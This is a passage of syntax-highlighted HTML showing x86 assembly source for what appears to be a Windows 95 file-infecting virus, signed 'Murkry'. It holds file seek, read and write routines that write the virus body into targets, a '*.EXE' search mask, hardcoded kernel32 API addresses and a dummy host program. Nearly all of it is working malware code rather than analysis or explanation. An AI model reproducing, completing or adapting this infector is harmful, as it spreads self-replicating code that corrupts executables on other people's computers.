        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;write from virus start</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FILE_WRITE</span><span class="sc0">

 
</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">;WHERE WE ARE TO RETURN TO </span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">;WHERE WE ARE TO RETURN TO </span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_lclose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SEEKWrite</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;amount to write</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">;where to write from</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;file begin method</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;high dword of offset into file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;low  dword of offset into file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">

 
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">fileret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; where to write from</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; amount to write</span><span class="sc0">

</span><span class="sc5">FILE_WRITE</span><span class="sc4">:</span><span class="sc0">
        
         </span><span class="sc6">LEA</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">JMP</span><span class="sc0">    </span><span class="sc5">FRI</span><span class="sc0">




</span><span class="sc1">;--------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FILE_READ</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">

</span><span class="sc5">FRI</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0">   </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">IOBYTES</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">;ADDRESS OF THE BYTES TO READ</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">                     </span><span class="sc1">;AMOUNT TO READ 400H</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">                     </span><span class="sc1">;BUFFER</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FHANDLE</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;FILE HANDLE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">FILE_READ_RET</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;call            FindFirstFileA       0BFF77893H</span><span class="sc0">
</span><span class="sc1">;call            FindNextFileA        0BFF778CBH</span><span class="sc0">
</span><span class="sc1">;call            CreateFileA          0BFF77817H</span><span class="sc0">
</span><span class="sc1">;call            _lclose              0BFF980CFH</span><span class="sc0">
</span><span class="sc1">;call            SetFilePointer       0BFF76FA0H</span><span class="sc0">
</span><span class="sc1">;call            ExitProcess          0BFF8AFB0H</span><span class="sc0">
</span><span class="sc1">;call            ReadFile             0BFF75806H</span><span class="sc0">
</span><span class="sc1">;call            WriteFile            0BFF7580DH</span><span class="sc0">


</span><span class="sc5">FILE_EXE</span><span class="sc0">        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;SAD BUT TRUE THESE ARE ALL HARD CODED ;(</span><span class="sc0">

</span><span class="sc5">FindFirstFileA</span><span class="sc0">  </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF77893H</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">   </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF778CBH</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">     </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF77817H</span><span class="sc0">
</span><span class="sc5">_lclose</span><span class="sc0">         </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF980CFH</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">  </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF76FA0H</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">        </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF75806H</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">       </span><span class="sc9">Dd</span><span class="sc0">     </span><span class="sc2">0BFF7580DH</span><span class="sc0">

</span><span class="sc5">cpyrite</span><span class="sc0">         </span><span class="sc9">dB</span><span class="sc0">     </span><span class="sc12">'Murkry'</span><span class="sc0"> 
</span><span class="sc5">VSize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">


</span><span class="sc5">here</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;Dummy host does nothing but end </span><span class="sc0">
                                        </span><span class="sc1">;like int 20 in Dos </span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">


</span></div></body>
</html>
